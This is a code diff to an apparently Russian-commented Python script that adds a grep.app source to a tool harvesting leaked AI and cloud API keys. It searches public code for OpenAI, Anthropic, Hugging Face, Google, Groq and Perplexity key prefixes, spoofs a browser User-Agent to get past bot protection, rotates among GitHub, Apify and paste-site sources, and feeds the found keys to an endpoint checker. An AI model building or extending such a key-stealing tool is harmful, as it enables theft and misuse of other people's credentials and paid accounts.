@@ -368,6 +368,53 @@ def fetch_psbdmp_targets():
     logger.info(f"✅ psbdmp.ws: всего найдено целей: {len(targets)}")
     return targets
 
+# ─── ПАРСИНГ GREP.APP ──────────────────────────────────────────────────────
+def fetch_grep_app_targets():
+    logger.info("🔎 Ищу ключи на GitHub через grep.app...")
+    targets = []
+    
+    # Стандартные заголовки браузера, чтобы обмануть защиту от ботов
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        "Accept": "application/json"
+    }
+    
+    search_terms = ["sk-proj-", "sk-ant-", "hf_", "sk-kimi-", "sk-cp-", "AIzaSy", "pplx-", "gsk_"]
+    
+    for term in search_terms:
+        try:
+            url = "https://grep.app/api/search"
+            params = {"q": term, "page": random.randint(1, 3)}
+            resp = requests.get(url, params=params, headers=headers, timeout=15)
+            
+            # Если сработала защита (403), мгновенно выходим, чтобы переключиться на другой канал
+            if resp.status_code == 403:
+                logger.warning(f"⚠️ grep.app: Сработала защита от ботов (403). Переключаюсь на другой источник.")
+                return targets 
+                
+            if resp.status_code != 200:
+                logger.warning(f"⚠️ grep.app вернул {resp.status_code} для '{term}'")
+                continue
+                
+            data = resp.json()
+            hits = data.get("hits", {}).get("hits", [])
+            
+            for hit in hits:
+                snippet = hit.get("content", {}).get("snippet", "")
+                if snippet:
+                    extracted = extract_keys_from_text(snippet)
+                    targets.extend(extracted)
+                    if extracted:
+                        logger.info(f"   └ Найдено {len(extracted)} ключей в сниппете из {hit.get('repo', 'unknown')}")
+                        
+            time.sleep(0.5)
+            
+        except Exception as e:
+            logger.error(f"❌ Ошибка grep.app для '{term}': {e}")
+            
+    logger.info(f"✅ grep.app: всего найдено целей: {len(targets)}")
+    return targets
+
 # ─── ПРОВЕРКА ──────────────────────────────────────────────────────────────
 def check_endpoint(api_key, endpoint):
     try:
@@ -415,15 +462,17 @@ async def long_scan_loop():
     
     while time.time() - start_time < TOTAL_RUN_TIME:
         chance = random.random()
-        if chance < 0.5:
+        if chance < 0.4:
             targets = await asyncio.to_thread(fetch_github_targets)
-        elif chance < 0.75:
+        elif chance < 0.6:
             targets = await asyncio.to_thread(fetch_apify_targets)
-        else:
+        elif chance < 0.8:
             targets = await asyncio.to_thread(fetch_psbdmp_targets)
+        else:
+            targets = await asyncio.to_thread(fetch_grep_app_targets)
             
         total_checked += len(targets)
-        # ... дальше идет цикл for t in targets: (его менять не нужно)
+        # ... дальше цикл for t in targets (без изменений)
         
         for t in targets:
             key, endpoint = t["key"], t["endpoint"]
